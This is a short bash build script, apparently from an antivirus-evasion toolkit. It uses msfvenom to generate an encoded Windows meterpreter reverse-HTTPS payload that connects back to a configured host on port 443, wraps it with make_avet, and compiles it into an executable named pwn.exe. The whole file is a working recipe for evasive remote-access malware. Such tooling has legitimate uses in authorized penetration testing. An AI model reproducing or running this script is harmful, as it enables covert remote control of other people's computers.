#!/bin/bash          
. build/global_win32.sh

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > sc.txt
./make_avet -f sc.txt -k "somewhat.somewhere"
$win32_compiler -o pwn.exe avet.c -lws2_32
rm sc.txt && echo "" > defs.h